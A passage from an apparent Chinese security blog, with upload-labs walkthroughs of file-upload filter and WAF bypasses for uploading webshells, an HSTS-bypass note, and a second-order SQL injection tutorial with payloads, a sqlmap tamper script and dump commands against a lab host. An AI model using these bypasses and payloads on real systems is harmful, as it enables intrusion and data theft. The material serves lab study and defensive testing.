    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去 . 处理；由于在windows中会自动去掉后缀名中末尾的 .  , 即在后缀名末尾加 . 可绕过
pass-8:（系统特性绕过）   
if (file_exists(UPLOAD_PATH)) {
 $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
 $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
 $file_name = deldot($file_name);//删除文件名末尾的点
 $file_ext = strrchr($file_name, &apos;.&apos;);
 $file_ext = strtolower($file_ext); //转换为小写
 $file_ext = trim($file_ext); //首尾去空
 if(!in_array($file_ext, $deny_ext)) {
     $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
     $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单,但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过
pass-9:
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, &apos;.&apos;);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空

    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;黑名单过滤很全面，但是同样利用windows特性，构造paylaod， shell.php. .  
pass-10:  
if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;  黑名单过滤，将黑名单后缀替换为空，可双写后缀名绕过
4、白名单后缀名绕过pass-11：
$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
if(in_array($file_ext,$ext_arr)){
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;$img_path采用拼接方式，可通过路径名截断绕过，burpsuit抓包，上传shell.png,save_path改成../upload/11.php%00

访问http://127.0.0.1/upload/shell.php
%00截断利用条件：

需满足 php 版本&lt;5.3.4
php.ini中的magic_quotes_gpc是off状态的,受限于addslasheshes函数

pass-12:    
$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
if(in_array($file_ext,$ext_arr)){
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;与pass-11不同的时这里使用POST形式传入save_path,由于POST不能对%00自动解码，需要使用0x00进行绕过
上传shell.png,save_path改成../upload/11.php+  ; 使用 + 是为了方便定位，一直+ 对应的hex为2b，直接修改2b为00即可

访问 http://127.0.0.1/upload/shell.php

其实两个截断的原理都是0x00是字符串的结束标识符，且需要注意的是0x00截断的使用是在路径上！！！！！
pass-19也同样使用路径拼接的方式，同理，在save_name使用0x00截断即可绕过白名单但是不采取路径拼接的情况下应该考虑,htaccess解析规则和解析漏洞
5、文件头检查绕过pass-13：    
$file = fopen($filename, &quot;rb&quot;);
$bin = fread($file, 2); //只读2字节
fclose($file);
$strInfo = @unpack(&quot;C2chars&quot;, $bin);    
$typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    
$fileType = &apos;&apos;;    
switch($typeCode){      
    case 255216:            
        $fileType = &apos;jpg&apos;;
        break;
    case 13780:            
        $fileType = &apos;png&apos;;
        break;        
    case 7173:            
        $fileType = &apos;gif&apos;;
        break;
    default:            
        $fileType = &apos;unknown&apos;;
    }    
    return $fileType;检验文件头，手动添加 GIF89a即可绕过；pass-14 、pass-15同理
6、条件竞争绕过pass-17:     
   $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
$file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
$upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;


if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
         rename($upload_file, $img_path);
         $is_upload = true;
    }else{
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
        unlink($upload_file);
    }在if判断之前，已经move_uploaded_file将文件上传到目录中，如果后缀不在白名单内再删除，此时利用竞争条件争在保存文件后删除文件前来执行php文件在burpsuit不断发包，然后网页不断刷新访问


既然能执行命令，那么可以通过执行命令写一个webshell,pass-18同样是条件竞争
upload_labs:这里面比较通杀的方法是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。
7、解析漏洞绕过Apache1.X 2.X解析漏洞：Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。shell.php.jpg  —&gt;被解析为php脚本执行
IIS6.0中两个解析缺陷：（iis6.0 默认的可执行文件除了asp还包含这三种asa、cer、cdx） 
目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析执行     
xxx.jpg在xxx.asp目录下，xxx.jpg则按照asp解析执行文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析（这是因为在IIS6.0下，分号后面的不被解析）    xx.asp;.jpg被解析为asp脚本执行
Nginx解析漏洞： 

Nginx 0.5.* 
Nginx 0.6.* 
Nginx 0.7 &lt;= 0.7.65 
Nginx 0.8 &lt;= 0.8.37

以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。
IIS 7.0/Nginx0.8.41–1.5.6畸形解析漏洞
上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg/.php进行请求。
PHP CGI解析漏洞：
IIS 7.0/7.5Nginx &lt; 0.8.3以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析
多个Content-Disposition：
在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过
8、iconv函数限制上传在iconv转码的过程中,utf-&gt;gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：
$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “;
9、双文件上传：上传点支持多文件上传，但是却只对第一个文件做了过滤
f12找到上传的post表单，action属性是指定上传检测页面，补全url: https://www.xxx.com/xxx.php(asp)，
然后构造本地post提交表单第一个文件上传正常文件，第二个文件上传我们想要上传的webshell等
10、waf缺陷绕过安全狗4.0：
文件名回车绕过：（在文件名中插入特殊符号：分号、空格、单引号、换行符）
filename=&quot;shell.php&quot;
或者
filename=&quot;shell.php&quot;==绕过：（===同样也可以过）
filename==&quot;shell.php&quot;双写filename=;绕过
filename=;filename=&quot;shell.php&quot;%00截断 在文件名后面加上%00然后CTRL+SHIFT+U转成字符，这里后面不用加.jpg也可以
filename=&quot;shell.php .jpg&quot;上传文件的Content-Disposition扩展头字段在filename前插入任意字符长度?=508即可绕过安全狗上传任意后缀
原因是文件Content-Disposition字段的长度验证不准确
x*508;filename=&quot;shell.php&quot;垃圾字符填充：
filename=&quot;%20*500+1.php&quot;修改头特征：
去掉form-data
原：
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
bypass：
Content-Disposition: name=&quot;file&quot;; filename=&quot;shell.php&quot;(form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)或者更改form-data为一些不相关的值；
还可以增加额外的头进行干扰
Content-Type: image/gif
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
Content-Type: image/gif在http头增加额外字符：
AAAAAAAA:filename=&quot;secquan.jpg&quot;;
Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;shell.php&quot;
Content-Type: image/gifBaidu cloud ：
filename=&quot;xss.jpg .Php&quot;阿里云：
删掉Content-Type: image/jpeg即可绕过
云锁：正则的核心在匹配filename后面的值，思路是让它找不到匹配点。
原：
Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;
bypass：
Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=shell.php；对于换行等字符的其他应用：
对filename进行换行
filen
ame=&quot;shell.php&quot;对 = 换行
filename=
&quot;shell.php&quot;Tr3jer_CongRong大佬的总结：

filename在content-type下面
.asp{80-90}
NTFS ADS
.asp…
boundary不一致（boundary后添加空格）
iis6分号截断asp.asp;asp.jpg
apache解析漏洞php.php.ddd
boundary和content-disposition中间插入换行
hello.php:a.jpg然后hello.&lt;&lt;&lt;
filename=php.php
filename=”a.txt”;filename=”a.php”
name=\n”file”;filename=”a.php”
content-disposition:\n
.htaccess文件
a.jpg.\nphp
去掉content-disposition的form-data字段
php&lt;5.3 单双引号截断特性
删掉content-disposition: form-data;
content-disposition\00:
{char}+content-disposition
head头的content-type: tab
head头的content-type: multipart/form-DATA
filename后缀改为大写
head头的Content-Type: multipart/form-data;\n
.asp空格
.asp0x00.jpg截断
双boundary
file\nname=”php.php”
head头content-type空格:
form-data字段与name字段交换位置

链接：https://www.cnblogs.com/-qing-/p/10832850.html
https://xz.aliyun.com/t/2435
https://paper.seebug.org/219/



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="HSTS bypassing" alt="HSTS bypassing" href="/2020/05/21/HSTS-bypassing/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="HSTS bypassing" alt="HSTS bypassing"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; HSTS bypassing &gt;</div>
                            <div class="content flex1">
                                
  HSTS：HTTP Strict Transport SecurityHSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。
firefox+burp绕过方法：
解决方法1：使用低版本firefox &lt; 3.6.25浏览器的旧版本无法与HSTS标头配合使用，因此会禁用HSTS强制实施
解决方法2：导入burpsuit证书 

解决方法3：忽略HSTS检查

命名：test.currentTimeOffsetSecondsvalue：11491200
清除history&amp;cache，然后重启浏览器




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 21, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="二次注入详解" alt="二次注入详解" href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="二次注入详解" alt="二次注入详解"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 二次注入详解 &gt;</div>
                            <div class="content flex1">
                                
  0x01、二次注入原理：用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用
0x02、二次注入类型：
用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）
用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）

分析几个案例更容易理解；各个案例的源码我会在文末放出
0x03、案例1：直接以目标用户身份身份登录注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录
注册时构造payload：
用户名：admin&apos; -- -
密码：password登录处验证代码：
if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
// Check if username is empty
if(empty(trim($_POST[&quot;username&quot;]))){
    $username_err = &apos;Please enter username.&apos;;
} else{
    $username = trim($_POST[&quot;username&quot;]);
}

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}
####对用户输入没有进行特殊处理

if(empty(trim($_POST[&quot;username&quot;]))){
$username_err = &apos;Please enter username.&apos;;} else{
    $username = trim($_POST[&quot;username&quot;]);
  }

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}

// Validate credentials
if(empty($username_err) &amp;&amp; empty($password_err)){
    // Prepare a select statement
    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;
####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  
##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - 
##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事   
    if($stmt = mysqli_prepare($link, $sql)){
        // Bind variables to the prepared statement as parameters
        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。
###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入
        // Set parameters
        $param_username = $username;

        // Attempt to execute the prepared statement
        if(mysqli_stmt_execute($stmt)){
            // Store result
            mysqli_stmt_store_result($stmt);     
###获取$sql执行结果              
            // Check if username exists, if yes then verify password
            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在               
                // Bind result variables
                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。
                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。
                    if(password_verify($password, $hashed_password)){
                        /* Password is correct, so start a new session and
                        save the username to the session */
                        session_start();
                        $_SESSION[&apos;username&apos;] = $username;      
                        header(&quot;location: home.php&quot;);
                    } else{
                        // Display an error message if password is not valid
                        $password_err = &apos;The password you entered was not valid.&apos;;
                    }
                }
            } else{
                // Display an error message if username doesn&apos;t exist
                $username_err = &apos;No account found with that username.&apos;;
            }
        } else{
            echo &quot;Oops! Something went wrong. Please try again later.&quot;;
        }
    }0x04、案例2：经典案例sqli-labs-24，更改管理账户密码在注册时构造payload
用户名： admin&apos; #
密码：password注册时对用户输入的注册用户名进行特殊字符转义
$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
$pass= mysql_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
....
###此时payload被转义为admin\&apos;\ #
...
$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());
...
##存入数据库后payload被还原为: admin&apos; #也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图

登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）
function sqllogin(){
   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);
   $row = mysql_fetch_row($res);
//print_r($row) ;
   if ($row[1]) {
return $row[1];
   } else {
  return 0;
   }
}简单验证一下注册和登录流程：

更改密码：
$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
####直接获取当前用户名进行密码更新
###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;
$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
........至此完成二次注入对目标用户密码的修改
0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入） 以HTB的NightMare靶机为例：
注册帐户名 ： ’
登录进入发现SQL报错

初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换
&apos; -- -  仍然报错；寻找正确闭合方式
&quot; -- - 回显SQL报错信息
&apos;) -- -无SQL报错信息
1&apos;) or 1=1 #无SQL报错信息
&apos;) order by 1000#   回显SQL报错信息
&apos;) order by 1#  无SQL报错信息
.....
###最终验证出列值为 2 使用SQLMAP进行POST二次注入；编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 
https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
注册：register username位置填入 payload ;密码固定password=123456    
post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }
然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  http://10.10.10.66/notes.php在index之后请求notes.php验证结果
response = s.post(“http://10.10.10.66/register.php&quot;, data=post_data)
php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)
最终tamper：
#!/usr/bin/env python
import reimport requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def create_account(payload):
s = requests.Session()

post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }
proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }
response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)
php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)

return &quot;PHPSESSID={0}&quot;.format(php_cookie)

def tamper(payload, **kwargs):
headers = kwargs.get(&quot;headers&quot;, {})
headers[&quot;Cookie&quot;] = create_account(payload)
return payloadsqlmap语句：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080

注意点：

post包中密码需要和tamper脚本中一致
去掉login.req中的cookie那一行
使用代理的话需要开启Burpsuit

这里就直接贴最终的paylaod吧：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast####需要–no-cast 参数
0x06、总结：主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的
参考链接：
http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/
http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
                            </div>
                        </div>
                    </a>
                


            </div>
            <div class="swiper-scrollbar"></div>
        </div>
    </div>
</div>
<script>

    function getSwiperPrams() {
        var windowsWidth = $(document).width()
        var slidesPerView
        var direction;
        if(windowsWidth > 1500){
            direction = 'horizontal'
            slidesPerView = 4
        }else if(windowsWidth > 1100){
            direction = 'horizontal'
            slidesPerView = 3
        }else if(windowsWidth > 1000){
            direction = 'horizontal'
            slidesPerView = 2
        }else{
            slidesPerView = 1
            direction = 'vertical'
        }
        return {
            direction: direction,
            slidesPerView: slidesPerView
        }
    }
    var params = getSwiperPrams()

  var mySwiper = new Swiper('.swiper-container', {
    direction: params.direction, // 垂直切换选项
    mousewheel: true,
    slidesPerView: params.slidesPerView,
    spaceBetween: 30,
    scrollbar: {
      el: '.swiper-scrollbar'
    },
    on: {
        resize: function(){

        },
    },

    // 如果需要滚动条
    scrollbar: {
      el: '.swiper-scrollbar',
    },
  })
</script>

  </div>
  <!--
  <div class="main-bottom">
    <div class="music flex flex-pack-justify flex-align-center">
      <div class="control">
        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
      </div>
      <div class="msg">
        <span class="time"></span>
        <div class="line" ref="progress-line-warp">
          <div class="song-msg">周杰伦 - 说好不哭</div>
          <!--<div class="current-line" ref="progress-line">
            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
          </div>-->
        </div>
        <span class="all-time"></span>
      </div>
      <div class="right-control">
        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
          <span class="iconfont icon-ttpodicon"></span>
          <span class="number flex1">3</span>
        </a>
      </div>
      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
        Your browser does not support the audio element.
      </audio>
    </div>
  </div>
  <div class="music-list">
    <div id="musiclist">
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">说好不哭 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">爱在西元前 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">龙拳 - 周杰伦</span>
        </a>
      
    </div>
  </div>
</div>

<script>
  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
  let musics = $('.music-item')
  musics.eq(playIndex).addClass('active')
  var audio = document.getElementById("audio");

  $('.song-msg').html(musics[playIndex].dataset.name)
  audio.src = musics[playIndex].dataset.url


  var playbtn = document.getElementsByClassName("play-icon")[0];
  var playing = false;
  audio.loop = false;
  audio.addEventListener('ended', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  audio.addEventListener('play', function () {
    playbtn.classList.remove("icon-kaishi1")
    playbtn.classList.add("icon-kaishi")
    playing= true
  }, false);
  audio.addEventListener('pause', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  function toogleShowMusicList() {
    var musiclist = document.getElementsByClassName("music-list")[0];
    if(musiclist.className.indexOf("active") === -1){
      musiclist.classList.add("active")
    }else{
      musiclist.classList.remove("active");
    }
  }

  function playControl() {
    if(playing){
      audio.pause()
    }else{
      audio.play()
    }
  }

  function changePlayIndex(index) {
    if(playIndex !== index){
      localStorage.setItem('playIndex',index)
      playIndex = index
      musics.removeClass('active')
      musics.eq(playIndex).addClass('active')
      $('.song-msg').html(musics[playIndex].dataset.name)
      audio.src = musics[playIndex].dataset.url
      audio.play()
    }else{
      playControl()
    }
  }

  function preSong() {
    var index
    if(playIndex === 0){
      index = musics.length - 1
    }else{
      index = playIndex - 1
    }
    changePlayIndex(index)
  }

  function nextSong() {
    var index
    if(playIndex === musics.length - 1){
      index = 0
    }else{
      index = playIndex + 1
    }
    changePlayIndex(index)
  }
-->
  function toggleMenu() {
    var mainLeft = $('.main-left')
    if(mainLeft.hasClass('active')){
      mainLeft.removeClass('active')
      $('.menu').removeClass('icon-close')
      $('.menu').addClass('icon-menu')
    }else{
      mainLeft.addClass('active')
      $('.menu').removeClass('icon-menu')
      $('.menu').addClass('icon-close')
    }
  }
</script>
